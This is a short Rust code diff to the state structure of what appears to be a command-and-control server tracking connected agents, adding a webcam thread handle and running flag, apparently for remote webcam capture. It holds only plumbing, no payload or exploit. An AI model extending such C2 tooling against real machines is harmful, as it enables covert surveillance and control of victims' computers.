@@ -2,13 +2,15 @@ use crate::constants::OUTPATH;
 use std::{
     fs,
     net::TcpStream,
-    sync::{Arc, Mutex},
+    sync::{Arc, Mutex, atomic::AtomicBool}, thread::JoinHandle,
 };
 
 pub struct C2State {
     pub agents: Arc<Mutex<Vec<AgentConnection>>>,
     pub active_mod: Arc<Mutex<String>>,
     pub active_session: Arc<Mutex<Option<usize>>>,
+    pub webcam_handle: Arc<Mutex<Option<JoinHandle<()>>>>,
+    pub webcam_running: Arc<AtomicBool>
 }
 
 #[derive(Debug)]
@@ -19,12 +21,15 @@ pub struct AgentConnection {
     pub conn: TcpStream,
 }
 
+
 impl C2State {
     pub fn new() -> Self {
         Self {
             agents: Arc::new(Mutex::new(Vec::new())),
             active_mod: Arc::new(Mutex::new("manager".to_string())),
             active_session: Arc::new(Mutex::new(None)),
+            webcam_handle: Arc::new(Mutex::new(None)),
+            webcam_running: Arc::new(AtomicBool::new(false)),
         }
     }
 
@@ -95,7 +100,7 @@ impl C2State {
             id: agent.id,
             ip: agent.ip.clone(),
             path: agent.path.clone(),
-            conn: agent.conn.try_clone().map_err(|e| e.to_string())?,
+            conn: agent.conn.try_clone().map_err(|e| e.to_string())?
         })
     }
 
